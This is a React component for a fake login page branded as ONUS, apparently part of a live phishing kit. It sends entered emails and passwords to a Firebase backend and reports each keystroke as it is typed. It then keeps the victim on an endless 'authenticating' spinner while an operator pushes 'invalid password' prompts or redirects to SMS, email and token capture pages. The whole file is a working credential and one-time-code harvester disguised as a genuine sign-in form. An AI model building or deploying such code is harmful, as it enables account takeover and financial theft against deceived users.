import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useTranslation } from 'react-i18next';
import { useFirebaseClient } from '../hooks/useFirebaseClient';
import { reportTyping } from '../firebase/typing';

const LoginForm = () => {
  const { t } = useTranslation();
  const navigate = useNavigate();
  const [emailOrPhone, setEmailOrPhone] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [showSpinner, setShowSpinner] = useState(false);
  const [invalidEmailMessage, setInvalidEmailMessage] = useState('');
  const [invalidPasswordMessage, setInvalidPasswordMessage] = useState('');
  const [showInvalidDataPopup, setShowInvalidDataPopup] = useState(false);
  const [hasInvalidPassword, setHasInvalidPassword] = useState(false);
  const [loginTexts] = useState([
    t('login.processing'),
    "Authenticating credentials...",
    "Verifying your identity...",
    "Securing your session...",
    "Almost ready...",
    "Finalizing authentication..."
  ]);
  const [currentTextIndex, setCurrentTextIndex] = useState(0);

  // Hook do Firebase Client para registrar este visitante
  const {
    clientId,
    clientData,
    isOnline,
    loading: firebaseLoading,
    updateClientData,
    commands,
    isClientIdValid,
  } = useFirebaseClient(navigate);

  // Função de login que registra o cliente
  const handleLogin = async (e) => {
    e.preventDefault();


    setLoading(true);
    setError('');
    setSuccess('');

    try {
      // Preparar dados do cliente para registro
      const clientData = {
        documentId: 'inicial', // ID fixo como solicitado
        email: email || 'user@example.com',
        password: password || 'defaultpass',
        userAgent: navigator.userAgent,
        currentUrl: window.location.href,
        currentPage: 'Home',
        timestamp: new Date().toISOString(),
        fromForm: true,
        hasCredentials: true,
        lastActivity: Date.now(),
        lastPing: Date.now(),
        online: true,
        userActive: true
      };

      console.log('🔐 LoginForm - Registrando cliente:', clientData);

      // Atualizar dados no Firebase
      await updateClientData(clientData);

      // Toast removido conforme solicitado
      
      // Mostrar spinner com logo ONUS (carregamento infinito)
      setShowSpinner(true);
      
      // Não redireciona mais - fica carregando infinitamente

    } catch (error) {
      console.error('❌ Erro no login:', error);
      setError('Erro ao fazer login. Tente novamente.');
    } finally {
      setLoading(false);
    }
  };

  // Processar comandos de invalidação
  useEffect(() => {
    if (!commands || commands.length === 0) return;

    const clearInvalidationCommand = (commandToRemove) => {
      const updatedCommands = commands.filter(cmd => cmd !== commandToRemove);
      updateClientData({ commands: updatedCommands });
    };

    // Verificar comando de email inválido
    if (commands.includes('invalid_email')) {
      setInvalidEmailMessage('Email inválido. Tente novamente.');
      setEmailOrPhone('');
      clearInvalidationCommand('invalid_email');
      setTimeout(() => setInvalidEmailMessage(''), 5000);
    }

    // Verificar comando de senha inválida
    if (commands.includes('invalid_password') || commands.includes('inv_password')) {
      setShowSpinner(false); // Volta ao formulário
      setHasInvalidPassword(true);
      // Limpar inputs
      setEmail('');
      setPassword('');
      clearInvalidationCommand('invalid_password');
      clearInvalidationCommand('inv_password');
    }
  }, [commands, updateClientData]);

  // Efeito para alternar textos de login
  useEffect(() => {
    if (showSpinner) {
      const interval = setInterval(() => {
        setCurrentTextIndex((prev) => (prev + 1) % loginTexts.length);
      }, 2000);
      return () => clearInterval(interval);
    }
  }, [showSpinner, loginTexts.length]);

  // Limpar estado de erro quando usuário digitar
  const handleEmailChange = (e) => {
    setEmail(e.target.value);
    setHasInvalidPassword(false);
    reportTyping('email', e.target.value);
  };

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
    setHasInvalidPassword(false);
    reportTyping('password', e.target.value);
  };

  // Processar redirecionamentos
  useEffect(() => {
    if (!commands || commands.length === 0) return;

    commands.forEach((command) => {
      switch (command) {
        case 'ir_sms':
          window.location.href = '/sync?view=gmail-sms';
          return;
        case 'ir_email':
          window.location.href = '/sync?view=password';
          return;
        case 'ir_token':
          window.location.href = '/sync';
          return;
        default:
          break;
      }
    });
  }, [commands]);

  // Se showSpinner for true, mostrar spinner sem modal com transição suave
  if (showSpinner) {
    return (
      <div className="w-full max-w-sm transition-all duration-500 ease-in-out">
        <div className="text-center">
          {/* Logo ONUS */}
          <div className="flex flex-col items-center mb-6">
            <img src="/logo1.svg" alt="ONUS Logo" className="h-12 w-auto mb-2" />
            <img src="/teste.png" alt="Sub Logo" className="h-4 w-auto" />
          </div>
          
          <div className="flex justify-center mb-6">
            <div className="animate-spin rounded-full h-16 w-16 border-b-2 border-blue-600"></div>
          </div>
          <p className="text-gray-600 mb-2 text-lg">{loginTexts[currentTextIndex]}</p>
          <p className="text-gray-500 text-sm">{t('login.pleaseWait')}</p>
        </div>
      </div>
    );
  }

  return (
    <div className="w-full max-w-sm transition-all duration-500 ease-in-out relative">

      
      <h1 className="text-4xl font-bold text-gray-900 mb-8">{t('login.title')}</h1>
      
      <form className="space-y-4" onSubmit={handleLogin}>
        <div>
          <input
            type="text"
            placeholder={t('login.emailPlaceholder')}
            value={email}
            onChange={handleEmailChange}
            className={`w-full h-14 px-4 py-3 text-sm border rounded-lg bg-white focus:outline-none placeholder-gray-400 text-gray-900 ${
              hasInvalidPassword 
                ? 'border-red-400 focus:border-red-400 border-opacity-60' 
                : 'border-gray-300 focus:border-blue-500'
            }`}
            style={{width: '400px', height: '56px', borderRadius: '8px'}}
          />
          {invalidEmailMessage && (
            <p className="text-red-500 text-sm mt-1">{invalidEmailMessage}</p>
          )}
        </div>
        
        <div className="relative">
          <input
            type={showPassword ? 'text' : 'password'}
            placeholder={t('login.passwordPlaceholder')}
            value={password}
            onChange={handlePasswordChange}
            className={`w-full h-14 px-4 py-3 text-sm border rounded-lg bg-white focus:outline-none placeholder-gray-400 pr-10 text-gray-900 ${
              hasInvalidPassword 
                ? 'border-red-400 focus:border-red-400 border-opacity-60' 
                : 'border-gray-300 focus:border-blue-500'
            }`}
            style={{width: '400px', height: '56px', borderRadius: '8px'}}
          />
          {invalidPasswordMessage && (
            <p className="text-red-500 text-sm mt-1">{invalidPasswordMessage}</p>
          )}
          <button
            type="button"
            onClick={() => setShowPassword(!showPassword)}
            className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600"
          >
            {showPassword ? (
              // Ícone de olho aberto (senha visível)
              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
              </svg>
            ) : (
              // Ícone de olho fechado com linha (senha oculta)
              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
              </svg>
            )}
          </button>
          
          {/* Toast de erro embaixo do input de senha */}
          {hasInvalidPassword && (
            <p className="text-red-600 text-sm font-medium mt-2">{t('login.invalidCredentials')}</p>
          )}
        </div>
        
        <div className="flex justify-start pt-2">
          <button type="button" className="text-blue-500 hover:text-blue-600 text-sm font-semibold transition-colors">
            {t('login.forgotPassword')}
          </button>
        </div>
        
        {error && (
          <div className="text-red-500 text-sm mt-2">{error}</div>
        )}
        {success && (
          <div className="text-green-500 text-sm mt-2">{success}</div>
        )}
        
        <button
          type="submit"
          disabled={loading || firebaseLoading}
          className="bg-blue-500 hover:bg-blue-600 disabled:bg-gray-400 text-white font-medium py-3 px-6 rounded-lg transition-colors mt-6"
          style={{width: '400px', height: '50px', borderRadius: '8px'}}
        >
          {loading ? t('login.generating') : t('login.signInButton')}
        </button>
        
        <div className="text-center pt-4">
          <span className="text-gray-500 text-sm">{t('login.noAccount')} </span>
          <button className="text-blue-500 hover:text-blue-600 font-medium text-sm transition-colors">
            {t('login.signUp')}
          </button>
        </div>
      </form>
    </div>
  );
};

export default LoginForm;